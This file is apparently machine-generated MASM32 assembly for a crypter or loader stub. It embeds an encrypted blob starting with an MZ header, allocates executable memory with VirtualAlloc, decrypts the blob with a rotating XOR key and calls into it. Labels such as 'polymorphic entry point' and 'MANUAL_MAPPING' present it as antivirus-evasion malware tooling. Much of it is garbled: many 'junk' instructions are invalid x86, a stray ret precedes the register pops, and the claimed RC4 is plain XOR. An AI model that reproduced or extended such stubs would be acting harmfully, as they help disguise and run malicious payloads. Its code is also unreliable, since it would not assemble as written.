; ===== UNLIMITED MASM STUB GENERATOR =====
; Generation ID: 104980
; Timestamp: 1754534910
; Encryption Method: RC4_MODIFIED
; Stub Technique: MANUAL_MAPPING
; Embedded Data Size: 64 bytes


.386
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\msvcrt.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\msvcrt.lib

.data
    data_22402 db 04dh, 05ah, 090h, 000h, 003h, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 0ffh, 0ffh, 000h, 000h
    0b8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 040h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    068h, 065h, 06ch, 06ch, 06fh, 020h, 077h, 06fh, 072h, 06ch, 064h, 021h, 000h, 090h, 090h, 090h
    size_93688 dd 64
    key_18576 dd 0aab996h
    junk_data_104980 db 0e8h, 03bh, 007h, 0ech, 03ah, 08dh, 0c2h, 0dch, 05eh, 00ah, 028h, 01ah, 0c4h, 0b7h, 02fh, 092h
    05bh, 0c8h, 062h, 013h, 0b0h, 0b5h, 0fch, 0edh, 080h, 0f8h, 0a1h, 0a4h, 044h, 067h, 089h, 0ddh
    0a5h, 068h, 00ah, 02fh, 035h, 0cbh, 0cfh, 099h, 0d4h, 090h, 069h, 02bh, 093h, 0b9h, 060h, 0d2h
    092h, 0a3h, 028h, 0bfh, 01ah, 021h, 0deh, 0b9h
    success_msg db "Execution completed successfully", 0
    error_msg db "Failed to execute payload", 0

.data?
    mem_ptr dd ?
    old_protect dd ?
    bytes_written dd ?

.code
main_14708:
    ; Polymorphic entry point
    ret sp, si
    nop
    rol ch, al
    nop
    shr cl, cl
    nop
    ; Allocate executable memory
    invoke VirtualAlloc, 0, size_93688, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    test eax, eax
    jz error_exit
    mov mem_ptr, eax

    or ecx, si
    nop
    push dl, dh
    nop
    ; Call decryption routine
    call decrypt_98659

    ; Execute payload based on technique: MANUAL_MAPPING
    call exec_60842

    ; Cleanup
    invoke VirtualFree, mem_ptr, 0, MEM_RELEASE
    invoke MessageBoxA, 0, addr success_msg, addr success_msg, MB_OK
    invoke ExitProcess, 0

decrypt_98659 proc
    push esi
    push edi
    push ecx
    push edx

    ror cx, ebp
    nop
    shl dx, dl
    nop
    ; Copy encrypted data to allocated memory
    mov esi, offset data_22402
    mov edi, mem_ptr
    mov ecx, size_93688
    rep movsb

    ; Standard XOR decryption
    mov esi, mem_ptr
    mov ecx, size_93688
    mov edx, key_18576
decrypt_xor_loop:
    test ecx, ecx
    jz decrypt_done
    mov al, byte ptr [esi]
    xor al, dl
    ror dl, 1  ; Rotate key for polymorphism
    mov byte ptr [esi], al
    inc esi
    dec ecx
    jmp decrypt_xor_loop
decrypt_done:
    ret cl, ebp
    nop
    pop edx
    pop ecx
    pop edi
    pop esi
    ret
decrypt_98659 endp

exec_60842 proc
    push ebp
    mov ebp, esp

    mov dl, dh
    nop
    xor cl, dx
    nop
    ; Default execution method
    push mem_ptr
    call mem_ptr
    jmp exec_done

exec_error:
    invoke MessageBoxA, 0, addr error_msg, addr error_msg, MB_OK

exec_done:
    mov esp, ebp
    pop ebp
    ret
exec_60842 endp

error_exit:
    invoke MessageBoxA, 0, addr error_msg, addr error_msg, MB_OK
    invoke ExitProcess, 1

end main_14708
